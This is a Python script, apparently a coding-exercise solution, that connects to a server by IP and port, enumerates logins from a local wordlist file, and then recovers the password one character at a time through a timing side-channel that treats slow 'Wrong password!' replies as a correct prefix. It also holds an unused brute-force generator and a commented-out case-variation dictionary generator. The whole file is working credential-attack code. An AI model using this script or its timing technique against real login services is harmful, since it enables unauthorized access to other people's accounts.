import socket
import sys
import json
import itertools
import string
import datetime

def connection(ip, port):
    dictionary = {"login": None, "password": " "}
    address = (ip, port)
   # message = brute_force()
    login = dictionary_login()
    password = next_letter()
    with socket.socket() as client_socket:
        client_socket.connect(address)
        while True:
            new_login = next(login)
            dictionary["login"] = new_login
            value = json.dumps(dictionary, indent=2)
            client_socket.send(value.encode())
            response = client_socket.recv(1024).decode()
            if json.loads(response) == {"result": "Wrong password!"}:
                temp = ""
                break
        while True:
            dictionary["password"] = temp
            new_password = next(password)
            dictionary["password"] += new_password
            value = json.dumps(dictionary)
            send_time = datetime.datetime.now()
            client_socket.send(value.encode())
            response = client_socket.recv(1024).decode()
            response_time = datetime.datetime.now()
            time_period = response_time - send_time
            if time_period.microseconds > 1000 and json.loads(response) == {"result": "Wrong password!"}:
                password = next_letter()
                temp = dictionary["password"]
            elif json.loads(response) == {"result": "Connection success!"}:
                print(value)
                exit()


def dictionary_login():
    with open("/Users/igorfurgala/Documents/logins.txt", "r") as login_file:
        for lines in login_file:
            login = lines.strip()
            yield login


def next_letter():
    for n in string.ascii_letters + string.digits:
        yield n


def brute_force():
    possible = "abcdefghijklmnopqrstuwxyzv0123456789"
    for n in range(1, len(possible)+1):
        for a in itertools.product(possible, repeat=n):
            yield "".join(a)


"""
def dictionary_password():
    with open("/Users/igorfurgala/Documents/passwords.txt", "r") as password_file:
        for lines in password_file:
            word = lines.strip()
            word = map(''.join, itertools.product(*zip(word.upper(), word.lower())))
            for w in word:
                yield w
"""


def main():
    args = sys.argv
    ip = args[1]
    port = int(args[2])
    # message = args[3]
    # message = message.encode()
    connection(ip, port)
    # print(response.decode())


if __name__ == "__main__":
    main()
